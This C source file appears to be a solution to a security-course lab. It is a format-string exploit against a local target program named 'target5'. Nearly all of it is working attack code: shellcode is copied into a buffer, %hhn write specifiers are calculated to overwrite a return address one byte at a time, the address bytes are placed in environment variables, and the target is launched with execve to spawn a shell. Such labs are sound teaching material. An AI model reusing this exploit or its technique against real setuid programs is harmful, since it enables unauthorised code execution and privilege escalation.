#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target5"

#define NOP 0x90
#define RET_ADDR 0x3021fea8
#define BUFF_LOC 0x3021faa0
#define FMTSTR_LOC 0x3021f9a0
#define SHELL_SIZE 45
#define ret "\xa8\xfe\x21\x30"
#define retp1 "\xa9\xfe\x21\x30"
#define retp2 "\xaa\xfe\x21\x30"
#define retp3 "\xab\xfe\x21\x30"
#define dummyVal "XXXXXXX"

// <RET><dum1><RET+1><dum2><RET+2><dum><RET+3><SHELLCODE><??%8x><size1%hhnsize2%hhnsize3%hhnsize4%hhn>
int main(void)
{
  char* args[3];
  char* env[20];
  char attackStr[256];
  memset(attackStr, NOP, 256);

  // the addresses are actually 64-bits!!!!!!!
  memcpy(attackStr, shellcode, SHELL_SIZE);

  // shellcode at formatString 0x3021f9a0 + 60 = 3021F9DC
  // from here need 4 %8x before hitting beginning of formatString
  // xDC - shellcode - 4*8 = 143
  // xF9 - xDC = 29
  // since using hhn, can "wrap around" and get value (just make sure 16 bits are correct)
  // x121 - xF9 = 40
  // x30 - x21 = 15
  char* addr_writes = "%8x%8x%8x%8x%143x%hhn%29x%hhn%40x%hhn%15x%hhn";

  // stick the writes after shellcode
  memcpy(&attackStr[SHELL_SIZE], addr_writes, strlen(addr_writes));

  args[0] = TARGET;
  args[1] = ret;
  args[2] = NULL;
  // the addresses are actually 64-bits!!!!!!! pad the \00 in the addresses
  env[0] = "\00";
  env[1] = "\00";
  env[2] = "\00";
  env[3] = dummyVal;
  env[4] =  retp1;
  env[5] = "\00";
  env[6] = "\00";
  env[7] = "\00";
  env[8] = dummyVal;
  env[9] = retp2;
  env[10] = "\00";
  env[11] = "\00";
  env[12] = "\00";
  env[13] = dummyVal;
  env[14] = retp3;
  env[15] = "\00";
  env[16] = "\00";
  env[17] = "\00";
  env[18] = "\x90\x90\x90";
  env[19] = attackStr;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
